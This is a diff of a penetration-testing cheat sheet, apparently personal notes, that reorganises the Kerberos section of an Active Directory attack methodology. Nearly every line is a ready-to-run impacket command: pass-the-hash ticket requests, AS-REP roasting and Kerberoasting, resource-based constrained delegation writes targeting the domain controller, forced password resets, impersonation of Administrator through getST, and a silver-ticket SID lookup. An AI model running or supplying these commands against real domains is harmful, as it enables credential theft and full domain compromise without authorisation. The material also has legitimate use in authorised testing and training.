@@ -521,68 +521,31 @@ while read -r user; do finger "$user"@$TARGET; done < usernames
 
 [*] (88) Kerberos
 +---------- Clock skew ----------+
- sudo ntpdate -u $TARGET
+sudo ntpdate -u $TARGET
 
-+---------- .Ccache Guest ----------+
-impacket-getTGT -dc-ip $TARGET '$DOM'/'Guest' -no-pass
++---------- Create .ccache ----------+
+impacket-getTGT -dc-ip $TARGET $DOM/Guest -no-pass
+impacket-getTGT -dc-ip $TARGET $DOM/'$USERNAME':'$PASSWORD'
+impacket-getTGT -dc-ip $TARGET $DOM/'$USERNAME' -hashes :8846F7EAEE8FB117AD06BDD830B7586C
+
++---------- Use .ccache ----------+
 export KRB5CCNAME="$PWD/Guest.ccache"; chmod 0600 "$KRB5CCNAME"
-impacket-describeTicket Guest.ccache | grep 'Ticket Session Key' | cut -d ':' -f 2 | xargs
-
-+---------- .Ccache Username ----------+
-impacket-getTGT -dc-ip $TARGET '$DOM'/'$USERNAME':'$PASSWORD'
 export KRB5CCNAME="$PWD/$USERNAME.ccache"; chmod 0600 "$KRB5CCNAME"
-impacket-describeTicket $USERNAME.ccache | grep 'Ticket Session Key' | cut -d ':' -f 2 | xargs
 
-+---------- Kerberos Negotiation ----------+
-impacket-getTGT -dc-ip $TARGET -hashes :$(echo '$PASSWORD' | 2ntlm) $DOM/$USERNAME
-impacket-GetNPUsers -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -usersfile usernames
-impacket-GetUserSPNs -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -request
-impacket-GetUserSPNs -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -usersfile usernames
-impacket-changepasswd -dc-ip $TARGET '$DOM'/'$USERNAME'@$TARGET -no-pass -newpass '123qweasdF!'
-impacket-changepasswd -dc-ip $TARGET $DOM/'$USERNAME'@$TARGET -k -no-pass -newpass '123qweasdF!' -p kpasswd -reset
-impacket-changepasswd -dc-ip $TARGET -newhashes :$(impacket-describeTicket $USERNAME.ccache | grep 'Ticket Session Key' | cut -d ':' -f 2 | xargs) '$DOM'/'$USERNAME':'$PASSWORD'@$TARGET
++---------- Kerberos .ccache Negotiation ----------+
 impacket-GetADUsers -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -all | awk '/---/{flag=1;next} flag {print $1}'
 impacket-GetADComputers -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass
+impacket-GetUserSPNs -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -request
+impacket-GetNPUsers -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -usersfile usernames
+impacket-GetUserSPNs -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -usersfile usernames
+impacket-rbcd -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -delegate-from '$USERNAME' -delegate-to 'DC$' -action 'write'
+impacket-findDelegation -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass
+impacket-changepasswd -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -newpass '123qweasdF!'
+impacket-changepasswd -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -newpass '123qweasdF!' -p kpasswd -reset
+impacket-changepasswd -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -newhashes :$(impacket-describeTicket $USERNAME.ccache | grep 'Ticket Session Key' | cut -d ':' -f 2 | xargs)
+impacket-getST -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -u2u -impersonate "Administrator" -spn "host/$DC" 2>/dev/null
+
 while IFS= read -r user; do echo "\n*-------------------*\n$user"; impacket-GetUserSPNs -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -request-user '$user'; done < usernames
-impacket-getST -dc-ip $TARGET -u2u -impersonate "Administrator" -spn "host/$DC" '$DOM'/'$USERNAME' -k -no-pass 2>/dev/null
-
-+---------- NTLM Negotiation ----------+
-impacket-getTGT -dc-ip $TARGET -hashes :$(echo '$PASSWORD' | 2ntlm) $DOM/$USERNAME
-impacket-findDelegation -dc-ip $TARGET $DOM/'$USERNAME':'$PASSWORD'
-impacket-GetNPUsers -dc-ip $TARGET $DOM/'$USERNAME':'$PASSWORD' -usersfile usernames
-impacket-GetUserSPNs -dc-ip $TARGET $DOM/'$USERNAME':'$PASSWORD' -request
-impacket-GetUserSPNs -dc-ip $TARGET $DOM/'$USERNAME':'$PASSWORD' -usersfile usernames
-impacket-changepasswd -dc-ip $TARGET '$DOM'/'$USERNAME'@$TARGET -no-pass -newpass '123qweasdF!'
-impacket-changepasswd -dc-ip $TARGET $DOM/'$USERNAME'@$TARGET -newpass '123qweasdF!' -altuser '$USERNAME' -altpass '$PASSWORD' -p kpasswd -reset
-impacket-changepasswd -dc-ip $TARGET -newhashes :$(impacket-describeTicket $USERNAME.ccache | grep 'Ticket Session Key' | cut -d ':' -f 2 | xargs) '$DOM'/'$USERNAME':'$PASSWORD'@$TARGET
-impacket-GetADUsers -dc-ip $TARGET $DOM/'$USERNAME':'$PASSWORD' -all | awk '/---/{flag=1;next} flag {print $1}'
-impacket-GetADComputers -dc-ip $TARGET $DOM/'$USERNAME':'$PASSWORD'
-while IFS= read -r user; do echo "\n*-------------------*\n$user"; impacket-GetUserSPNs -dc-ip $TARGET $DOM/'$USERNAME':'$PASSWORD' -request-user '$user'; done < usernames
-impacket-rbcd -dc-ip $TARGET $DOM/'$USERNAME':'$PASSWORD' -delegate-from '$USERNAME' -delegate-to 'DC$' -action 'write'
-impacket-getST -dc-ip $TARGET -u2u -impersonate "Administrator" -spn "host/$DC" '$DOM'/'$USERNAME':'$PASSWORD' 2>/dev/null
-
-+---------- Ticket Attacks ----------+
-sudo apt install -y heimdal-clients libsasl2-modules-gssapi-heimdal
-KRB5_FILE="custom_krb5.conf";export KRB5_CONFIG="$PWD/$KRB5_FILE"; nano ./"$KRB5_FILE"
-[libdefaults]
-    default_realm = $KRB5DOM
-    dns_lookup_realm = true
-    dns_lookup_kdc = true
-
-[realms]
-    $KRB5DOM = {
-        kdc = $DC
-        admin_server = $DC
-        default_domain = $DC
-    }
-
-[domain_realm]
-    $DOM = $KRB5DOM
-    .$DOM = $KRB5DOM
-
-TGT=$(impacket-getTGT $DOM/'$USERNAME':'$PASSWORD' -dc-ip $TARGET | grep -oP '(?<=\[\*\] Saving ticket in ).*'); echo "[*] Saving ticket in $TGT"; export KRB5CCNAME="$TGT"; chmod 0600 "$TGT"; echo '$PASSWORD' > kpassfile; kinit --password-file='kpassfile' -c "$KRB5CCNAME" '$USERNAME@$KRB5DOM'; klist
-
-ST='cifs/$DC'; F=$(impacket-getST $DOM/'$USERNAME':'$PASSWORD' -dc-ip $TARGET -spn $ST | grep -oP '(?<=\[\*\] Saving ticket in ).*'); echo "[*] Saving ticket in $F"; export KRB5CCNAME="$F"; chmod 0600 "$F"; echo '$PASSWORD' > kpassfile; kinit --password-file='kpassfile' -c "$KRB5CCNAME" '$USERNAME@$KRB5DOM'; klist
 
 +---------- Silver Ticket Attacks ----------+
 TICKET_SID=$(impacket-getPac '$DOM'/'$USERNAME':'$PASSWORD' -targetUser 'Administrator' 2>/dev/null | grep 'Domain SID: ' | cut -d ':' -f 2- | tr -d ' ');echo $TICKET_SID
